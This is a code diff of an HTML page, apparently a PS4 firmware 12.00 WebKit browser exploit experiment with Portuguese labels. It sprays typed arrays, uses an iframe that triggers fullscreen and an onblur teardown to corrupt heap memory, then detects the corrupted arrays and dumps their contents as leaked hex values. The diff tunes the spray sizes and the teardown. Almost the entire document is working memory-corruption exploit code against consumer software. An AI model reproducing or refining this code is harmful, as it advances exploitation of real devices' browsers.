@@ -2,19 +2,19 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 JSObject Leak - Leandro</title>
+    <title>PS4 Success Return - Leandro</title>
 </head>
 <body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - JSObject Leak</h1>
+    <h1>PS4 12.00 - Estabilização Final</h1>
     <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>
 
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Iframe (JSObject Spray)</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (Dump 0-127)</button>
+    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos</button>
+    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe</button>
+    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (Dump 0-63)</button>
 
     <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 10px; max-height: 400px; overflow-y: scroll;"></div>
+    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 11px;"></div>
     <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
@@ -25,13 +25,13 @@
 
         function prepareObjects() {
             controllers = [];
+            // Voltamos ao tamanho 64 que é um bom meio-termo para ver além dos zeros
             for(let i = 0; i < 5000; i++) {
-                // Mantemos o tamanho 128 para ter uma visão ampla
-                let arr = new Float64Array(128); 
+                let arr = new Float64Array(64); 
                 arr[0] = i; 
                 controllers.push(arr);
             }
-            statusPai.innerText = "5000 Objetos prontos.";
+            statusPai.innerText = "5000 Objetos Prontos.";
             statusPai.style.color = "blue";
         }
 
@@ -48,17 +48,15 @@
                     function st() {
                         document.documentElement.webkitRequestFullscreen();
                         window.onblur = function() {
-                            let s = [];
-                            for(let i = 0; i < 15000; i++) {
-                                // SPRAY DE OBJETOS REAIS (Não apenas números)
-                                // Isso força o WebKit a alocar Headers e CellNames
-                                s.push({ leak: ${PATTERN}, id: i, type: "JSObject" });
-                                
-                                // Intercalamos com o seu spray de sucesso
-                                let p = new Float64Array(128).fill(${PATTERN});
-                                s.push(p);
+                            // Spray Ultra-Simples e Massivo
+                            var s = new Array(20000);
+                            for(var i = 0; i < 20000; i++) {
+                                s[i] = new Float64Array(64).fill(${PATTERN});
                             }
-                            document.open(); document.write('<h1>FINALIZADO</h1>'); document.close();
+                            // O Teardown precisa ser agressivo
+                            document.open();
+                            document.write('<h1>CRASH</h1>');
+                            document.close();
                         };
                     }
                 <\/script></body></html>
@@ -71,7 +69,7 @@
             let corruptedIndex = -1;
 
             for(let i = 0; i < controllers.length; i++) {
-                // Se mudar de 'i', houve colisão
+                // Detectamos QUALQUER mudança no ID original
                 if (controllers[i][0] !== i) {
                     corrupted = controllers[i];
                     corruptedIndex = i;
@@ -80,17 +78,16 @@
             }
 
             if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: ID: " + corruptedIndex + "</span>";
+                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO NO ID: " + corruptedIndex + "</span>";
                 leakOutput.style.display = "block";
-                leakOutput.innerHTML = "<b>[ JSObject DUMP 0-127 ]</b><br>";
+                leakOutput.innerHTML = "<b>[ DUMP 0-63 ]</b><br>";
 
-                for(let i = 0; i < 128; i++) {
+                for(let i = 0; i < 64; i++) {
                     const val = corrupted[i];
                     const buf = new ArrayBuffer(8);
                     new Float64Array(buf)[0] = val;
                     const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                     
-                    // Se não for 0 e não for 414141, pintamos de vermelho!
                     let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141"));
                     let style = isInteresting ? "color:#fff; background:#a00;" : "";
                     
@@ -98,7 +95,7 @@
                     leakOutput.innerHTML += "O[" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
                 }
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Tente reiniciar o navegador.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Reinicie o navegador e tente novamente.</span>";
             }
         }
     </script>
